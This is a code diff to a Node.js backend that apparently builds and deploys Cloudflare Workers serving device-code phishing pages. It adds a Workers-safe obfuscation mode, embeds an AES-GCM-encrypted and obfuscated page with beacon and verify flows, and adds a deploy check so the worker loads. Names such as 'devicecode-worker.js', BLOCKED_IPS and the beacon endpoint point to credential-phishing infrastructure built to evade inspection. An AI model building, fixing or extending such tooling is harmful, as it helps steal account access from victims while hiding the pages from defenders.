@@ -374,11 +374,22 @@ function boolSetting(v) {
 // ─── JS Obfuscation (SINGLE-STAGE for browser performance) ──
 // Two-stage was causing browser hangs due to 3MB+ output
 // This single-stage approach is lighter but still effective
-function obfuscateJs(sourceCode) {
+//
+// options.workersSafe: required for code that runs in the Cloudflare
+// Workers runtime (the worker wrapper bundle). The Workers runtime has NO
+// `window` global, and with disableConsoleOutput/selfDefending enabled,
+// javascript-obfuscator emits a top-level shim of the form
+//     ...;_0x1de4b5=_0x2cfcbe();}catch(_0x34f1b6){_0x1de4b5=window;}
+// which throws "Uncaught ReferenceError: window is not defined" the moment
+// Cloudflare instantiates the module - so the whole script upload is
+// rejected and the link deployment fails. Browser-only code (the page
+// scripts) keeps the full option set.
+function obfuscateJs(sourceCode, options) {
     try {
         const JavaScriptObfuscator = require('javascript-obfuscator');
+        const workersSafe = !!(options && options.workersSafe);
 
-        console.log('[Obfuscation] Single-stage obfuscation...');
+        console.log('[Obfuscation] Single-stage obfuscation' + (workersSafe ? ' (workers-safe)' : '') + '...');
         const result = JavaScriptObfuscator.obfuscate(sourceCode, {
             compact: true,                     // Minify
             controlFlowFlattening: true,       // Flatten control flow
@@ -387,10 +398,14 @@ function obfuscateJs(sourceCode) {
             deadCodeInjectionThreshold: 0,
             debugProtection: false,            // Disabled - causes browser hangs
             debugProtectionInterval: 0,
-            disableConsoleOutput: true,
+            // Browsers only - the shim's catch branch assigns `window`,
+            // which does not exist in the Workers runtime.
+            disableConsoleOutput: !workersSafe,
             identifierNamesGenerator: 'hexadecimal',
             renameGlobals: false,              // Keep globals intact
-            selfDefending: true,               // Self-defending
+            // Browsers only - self-defending wraps the module in a
+            // browser-oriented integrity check; keep Workers output lean.
+            selfDefending: !workersSafe,
             stringArray: true,
             stringArrayCallsTransform: true,
             stringArrayEncoding: ['rc4'],      // RC4 encoding only
@@ -1631,7 +1646,28 @@ async function generateExportHtml(link, user, options) {
 // ─── Worker Script Builder ─────────────────────────────────
 async function buildWorkerScript(link, user, apiBaseUrl) {
     console.log('[WorkerBuilder] apiBaseUrl passed:', apiBaseUrl);
-    const pageHtml = await renderPageHtml(link, user, { apiBaseUrl: apiBaseUrl });
+    // Serve the EXACT same HTML format the Static Export tab produces
+    // (generateExportHtml -> renderPageHtml with exportForDownload: true):
+    // the self-contained, encrypted page. The previous "live" page render
+    // plus full-bundle obfuscation produced a single-line bundle whose top
+    // level referenced browser-only globals (window), which Cloudflare
+    // rejected with "Uncaught ReferenceError: window is not defined" and
+    // the deployment failed.
+    //
+    // The page keeps calling the backend APIs via __API_BASE (apiBaseUrl),
+    // so the device-code / verify / beacon flows are unchanged; the
+    // worker's own /api/* routes remain available for relative calls.
+    let pageDomain = '';
+    if (link.custom_domain) {
+        pageDomain = String(link.custom_domain).trim().replace(/^https?:\/\//i, '').replace(/\/+$/, '').toLowerCase();
+    } else if (link.worker_name) {
+        // cf_workers_subdomain is stored as a bare prefix ("powerballranger");
+        // normalise to the full hostname, mirroring routes/links.js.
+        const sub = String((user && user.cf_workers_subdomain) || config.CF_WORKERS_SUBDOMAIN || '').trim().toLowerCase();
+        const suffix = !sub ? 'workers.dev' : (sub.endsWith('.workers.dev') ? sub : sub + '.workers.dev');
+        pageDomain = String(link.worker_name) + '.' + suffix;
+    }
+    const pageHtml = await generateExportHtml(link, user, { apiBaseUrl: apiBaseUrl, domain: pageDomain });
     console.log('[WorkerBuilder] pageHtml contains BEACON_ENDPOINT:', pageHtml.includes('{{BEACON_ENDPOINT}}'));
     let workerJs = fs.readFileSync(path.join(__dirname, '..', '..', 'worker', 'devicecode-worker.js'), 'utf8');
 workerJs = workerJs.replace(/^\uFEFF/, '');
@@ -1718,29 +1754,89 @@ workerJs = workerJs.replace(/^\uFEFF/, '');
         replaceLiteralPlaceholder('{{BLOCKED_IPS}}', JSON.stringify(blockedIps));
         replaceLiteralPlaceholder('{{TEMPLATE_HTML}}', pageHtml);
 
-    // Align worker rendering with the downloaded HTML path: the embedded page
-    // HTML is already produced by renderPageHtml(), which applies the same
-    // obfuscation settings. Obfuscate the worker runtime wrapper when the
-    // admin/link setting is on, but keep a compatibility fallback if the
-    // obfuscator cannot handle the Cloudflare runtime code.
-    try {
-        const settings = await loadAdminSettings();
-        const shouldObfuscate = boolSetting(settings.obfuscation_enabled) || link.obfuscated;
-        if (shouldObfuscate) {
-            try {
-                const obfuscatedWorkerJs = obfuscateJs(workerJs);
-                if (obfuscatedWorkerJs && obfuscatedWorkerJs.length > workerJs.length) {
-                    workerJs = obfuscatedWorkerJs;
-                }
-            } catch (e) {
-                console.warn('[Templateloader] Worker obfuscation failed, keeping unobfuscated script:', e.message);
-            }
-        }
-    } catch (e) {
-        console.error('[Templateloader] Worker obfuscation check failed:', e.message);
+    // The worker wrapper is deliberately NOT obfuscated as a whole. The
+    // embedded page is the static-export format: its content is already
+    // AES-GCM encrypted and its browser JS already obfuscated per the admin
+    // settings - the exact security posture of the downloadable export,
+    // which has no wrapper at all. Obfuscating the wrapper on top of that:
+    //   1. Multiplied the bundle ~12x (an ~850KB page payload became an
+    //      11MB single-line bundle - above Cloudflare's Workers script size
+    //      limits of 1 MiB free / 10 MiB paid), so the upload failed.
+    //   2. With the default obfuscator options it injected a top-level
+    //      `window` fallback, which the Workers runtime rejects with
+    //      "Uncaught ReferenceError: window is not defined".
+    //   3. Added ~30s of obfuscation time to every deployment.
+    // The wrapper itself is not public (it lives in the CF account, not on
+    // the page), and the page payload it carries is already unreadable.
+
+    // ── Deploy-safety gate ────────────────────────────────────────
+    // Cloudflare instantiates the uploaded module before it accepts the
+    // script. If the module top level references a browser-only global
+    // (window, document, ...), the upload is rejected with:
+    //   Uncaught ReferenceError: window is not defined
+    // and the whole link deployment fails. Replicate exactly that check
+    // locally: import the final bundle as an ES module in a short-lived
+    // child Node process (which, like the Workers runtime, has no
+    // `window`) and require the default export's fetch handler. A broken
+    // bundle must never reach Cloudflare - fail the deployment with a
+    // clear error instead of shipping a worker Cloudflare would reject.
+    if (validateWorkerBundleForRuntime(workerJs) !== 0) {
+        throw new Error('Worker bundle failed the Workers-runtime validation: the module top level must not reference browser-only globals (such as window). Check worker/devicecode-worker.js and the template output.');
     }
 
     return workerJs;
+}
+
+// ─── Worker Bundle Runtime Validation ──────────────────────
+// Cloudflare parses AND instantiates the uploaded module before accepting
+// the script. A module whose top level references a browser-only global
+// (window, document, ...) is rejected with
+//   Uncaught ReferenceError: window is not defined
+// This replicates that check locally by importing the exact bundle that
+// would be uploaded in a short-lived child Node process: Node (like the
+// Workers runtime) provides fetch/Request/Response/URL but no window.
+// The child evaluates the module, requires the default export to expose a
+// fetch handler, and exits 0 only if the module is deployable.
+//
+// Returns the child exit code: 0 = deployable, non-zero = broken bundle.
+function validateWorkerBundleForRuntime(code) {
+    const os = require('os');
+    const { spawnSync } = require('child_process');
+    const bundlePath = path.join(os.tmpdir(), 'vc-worker-validate-' + process.pid + '-' + Date.now() + '.mjs');
+    const checker = [
+        'globalThis.self = globalThis;',
+        'import(process.argv[1]).then(function (m) {',
+        '  if (m && m.default && typeof m.default.fetch === "function") process.exit(0);',
+        '  process.exit(2);',
+        '}).catch(function () { process.exit(1); });',
+    ].join('\n');
+    try {
+        fs.writeFileSync(bundlePath, code);
+        const res = spawnSync(process.execPath, ['--input-type=module', '-e', checker, bundlePath], {
+            timeout: 90000,
+            stdio: 'ignore',
+            env: process.env,
+        });
+        if (res.error) {
+            // Validation could not run at all (e.g. missing runtime, timeout)
+            // - do not block deployments on a broken validator. A bundle that
+            // FAILS validation exits normally with a non-zero status, which
+            // is handled below.
+            console.warn('[WorkerBuilder] Runtime validation could not run (' + res.error.message + ') - skipping gate.');
+            return 0;
+        }
+        if (res.signal) {
+            // Killed by a signal (OOM etc.) - inconclusive, skip the gate.
+            console.warn('[WorkerBuilder] Runtime validation was killed by signal ' + res.signal + ' - skipping gate.');
+            return 0;
+        }
+        return res.status;
+    } catch (e) {
+        console.warn('[WorkerBuilder] Runtime validation error (' + e.message + ') - skipping gate.');
+        return 0;
+    } finally {
+        try { fs.unlinkSync(bundlePath); } catch (e) { /* ignore */ }
+    }
 }
 
 module.exports = {
